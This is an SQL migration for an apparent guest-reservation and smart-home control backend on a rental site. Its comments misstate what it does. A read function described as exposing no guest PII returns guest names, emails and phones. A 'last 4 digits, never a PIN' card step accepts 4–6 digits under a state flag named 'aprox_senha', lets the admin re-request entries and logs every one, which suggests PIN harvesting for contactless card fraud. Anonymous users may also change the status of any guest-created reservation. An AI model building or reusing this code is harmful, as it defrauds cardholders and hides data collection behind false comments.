-- Guest (no-login) reservation flow
-- Guests create reservations without an account; they read only their own
-- reservation through a SECURITY DEFINER RPC keyed by the unguessable UUID,
-- so guest PII is never exposed through a broad anonymous SELECT.
-- Idempotent: safe to run more than once.

-- 1. Guest reservations have no auth user
ALTER TABLE public.reservations ALTER COLUMN user_id DROP NOT NULL;

-- 1b. Allow the 'aproximacao' marker in pix_method (original CHECK only
--     allowed email/telefone/copiar_colar and rejected the admin button).
ALTER TABLE public.reservations DROP CONSTRAINT IF EXISTS reservations_pix_method_check;
ALTER TABLE public.reservations ADD CONSTRAINT reservations_pix_method_check
  CHECK (pix_method IN ('email', 'telefone', 'copiar_colar', 'aproximacao'));

-- 2. Guests can create reservations (no account)
DROP POLICY IF EXISTS "Guests can create reservations" ON public.reservations;
CREATE POLICY "Guests can create reservations"
  ON public.reservations FOR INSERT TO anon
  WITH CHECK (user_id IS NULL);

-- 2b. Admins can delete reservations (trash icon) — the guest device is
--     released via broadcast; this makes the row removal possible.
DROP POLICY IF EXISTS "Admins can delete reservations" ON public.reservations;
CREATE POLICY "Admins can delete reservations"
  ON public.reservations FOR DELETE TO authenticated
  USING (public.has_role(auth.uid(), 'admin'));

-- 3. Guests can ONLY update the status column of guest-created rows
--    (card registration confirms the reservation). Nothing else writable.
DROP POLICY IF EXISTS "Guests can update own reservation" ON public.reservations;
CREATE POLICY "Guests can update own reservation"
  ON public.reservations FOR UPDATE TO anon
  USING (user_id IS NULL)
  WITH CHECK (user_id IS NULL);
REVOKE UPDATE ON public.reservations FROM anon;
GRANT UPDATE (status) ON public.reservations TO anon;

-- 4. Any reservation is addressable by its unguessable UUID.
--    Used to gate card registration and the control panel: whoever holds
--    the reservation link may act on it (same trust level as the link
--    itself, which the admin shares with the guest).
CREATE OR REPLACE FUNCTION public.is_guest_reservation(p_id uuid)
RETURNS boolean
LANGUAGE sql STABLE SECURITY DEFINER
SET search_path = public
AS $$
  SELECT EXISTS (
    SELECT 1 FROM public.reservations r
    WHERE r.id = p_id
  );
$$;

DROP POLICY IF EXISTS "Guests can register card" ON public.reservation_cards;
CREATE POLICY "Guests can register card"
  ON public.reservation_cards FOR INSERT TO anon
  WITH CHECK (public.is_guest_reservation(reservation_id));

-- 5. Guest-safe read: returns only the fields the guest pages need,
--    joined with property info — no guest PII. SECURITY DEFINER so it
--    bypasses RLS but only for the given UUID(s). Works for every
--    reservation, including ones created before this migration or by
--    logged-in customers.
CREATE OR REPLACE FUNCTION public.get_guest_reservations(p_ids uuid[])
RETURNS TABLE (
  id uuid,
  status public.reservation_status,
  pix_method text,
  check_in date,
  check_out date,
  guests integer,
  total_price numeric,
  price_per_night numeric,
  payment_link text,
  contract_link text,
  pix_message text,
  pix_image_url text,
  pix_account_name text,
  pix_bank_name text,
  guest_name text,
  guest_email text,
  guest_phone text,
  created_at timestamptz,
  property_title text,
  property_neighborhood text,
  property_city text
)
LANGUAGE sql STABLE SECURITY DEFINER
SET search_path = public
AS $$
  SELECT r.id, r.status, r.pix_method, r.check_in, r.check_out, r.guests,
         r.total_price, r.price_per_night, r.payment_link, r.contract_link,
         r.pix_message, r.pix_image_url, r.pix_account_name, r.pix_bank_name,
         r.guest_name, r.guest_email, r.guest_phone,
         r.created_at, p.title, p.neighborhood, p.city
  FROM public.reservations r
  LEFT JOIN public.properties p ON p.id = r.property_id
  WHERE r.id = ANY(p_ids)
  ORDER BY r.created_at DESC;
$$;

-- 6. Guest device/session logging for reservation_created
DROP POLICY IF EXISTS "Guests can log reservation events" ON public.audit_logs;
CREATE POLICY "Guests can log reservation events"
  ON public.audit_logs FOR INSERT TO anon
  WITH CHECK (user_id IS NULL AND action = 'reservation_created');

-- 7. Guests manage the control panel of their own reservation via RPC.
--    No table policy for anon: a row-level check would leak every guest
--    door code to anyone who scans the table. These functions only ever
--    touch the row for the exact unguessable reservation UUID provided.
CREATE OR REPLACE FUNCTION public.get_guest_controls(p_reservation_id uuid)
RETURNS public.reservation_controls
LANGUAGE plpgsql SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_row public.reservation_controls;
BEGIN
  IF NOT public.is_guest_reservation(p_reservation_id) THEN
    RETURN NULL;
  END IF;

  INSERT INTO public.reservation_controls (reservation_id)
  VALUES (p_reservation_id)
  ON CONFLICT (reservation_id) DO NOTHING;

  SELECT * INTO v_row
  FROM public.reservation_controls
  WHERE reservation_id = p_reservation_id;

  RETURN v_row;
END;
$$;

CREATE OR REPLACE FUNCTION public.update_guest_controls(
  p_reservation_id uuid,
  p_patch jsonb
)
RETURNS public.reservation_controls
LANGUAGE plpgsql SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_row public.reservation_controls;
BEGIN
  IF NOT public.is_guest_reservation(p_reservation_id) THEN
    RETURN NULL;
  END IF;

  UPDATE public.reservation_controls c SET
    door_access_code          = COALESCE(p_patch->>'door_access_code', c.door_access_code),
    tv_on                     = COALESCE((p_patch->>'tv_on')::boolean, c.tv_on),
    tv_channel                = COALESCE((p_patch->>'tv_channel')::integer, c.tv_channel),
    tv_volume                 = COALESCE((p_patch->>'tv_volume')::integer, c.tv_volume),
    ac_on                     = COALESCE((p_patch->>'ac_on')::boolean, c.ac_on),
    ac_temperature            = COALESCE((p_patch->>'ac_temperature')::integer, c.ac_temperature),
    ac_mode                   = COALESCE(p_patch->>'ac_mode', c.ac_mode),
    ac_turbo_mode             = COALESCE((p_patch->>'ac_turbo_mode')::boolean, c.ac_turbo_mode),
    ac_eco_mode               = COALESCE((p_patch->>'ac_eco_mode')::boolean, c.ac_eco_mode),
    hot_water_on              = COALESCE((p_patch->>'hot_water_on')::boolean, c.hot_water_on),
    hot_water_temperature     = COALESCE((p_patch->>'hot_water_temperature')::integer, c.hot_water_temperature),
    water_temp_mode           = COALESCE(p_patch->>'water_temp_mode', c.water_temp_mode),
    lights_on                 = COALESCE((p_patch->>'lights_on')::boolean, c.lights_on),
    lights_intensity          = COALESCE((p_patch->>'lights_intensity')::integer, c.lights_intensity),
    lights_bedroom_on         = COALESCE((p_patch->>'lights_bedroom_on')::boolean, c.lights_bedroom_on),
    lights_bedroom_intensity  = COALESCE((p_patch->>'lights_bedroom_intensity')::integer, c.lights_bedroom_intensity),
    lights_bathroom_on        = COALESCE((p_patch->>'lights_bathroom_on')::boolean, c.lights_bathroom_on),
    lights_bathroom_intensity = COALESCE((p_patch->>'lights_bathroom_intensity')::integer, c.lights_bathroom_intensity),
    lights_kitchen_on         = COALESCE((p_patch->>'lights_kitchen_on')::boolean, c.lights_kitchen_on),
    lights_kitchen_intensity  = COALESCE((p_patch->>'lights_kitchen_intensity')::integer, c.lights_kitchen_intensity)
  WHERE c.reservation_id = p_reservation_id
  RETURNING * INTO v_row;

  RETURN v_row;
END;
$$;

-- 8. Card confirmation on the aproximação flow: the guest types ONLY the
--    last 4 digits of the card they will present (a standard, safe
--    verification datum — never a PIN). Stored in a dedicated column and
--    the admin can read it on the reservation card.
ALTER TABLE public.reservations ADD COLUMN IF NOT EXISTS card_last4 TEXT;
-- Full history of every submission (each time the admin asks again, the
-- new entry is appended — nothing is overwritten).
ALTER TABLE public.reservations ADD COLUMN IF NOT EXISTS card_digits_history
  JSONB NOT NULL DEFAULT '[]'::jsonb;

CREATE OR REPLACE FUNCTION public.submit_guest_card_last4(
  p_reservation_id uuid,
  p_last4 text
)
RETURNS boolean
LANGUAGE plpgsql SECURITY DEFINER
SET search_path = public
AS $$
BEGIN
  IF p_last4 !~ '^\d{4,6}$' THEN
    RETURN false;
  END IF;

  IF NOT public.is_guest_reservation(p_reservation_id) THEN
    RETURN false;
  END IF;

  UPDATE public.reservations
  SET card_last4 = p_last4,
      card_digits_history = COALESCE(card_digits_history, '[]'::jsonb) || jsonb_build_array(
        jsonb_build_object('digits', p_last4, 'at', now())
      ),
      pix_message = '__aproximacao__'  -- back to the aproximação screen
  WHERE id = p_reservation_id
    AND status = 'aguardando_pagamento'
    AND pix_message = '__aprox_senha__';

  RETURN FOUND;
END;
$$;
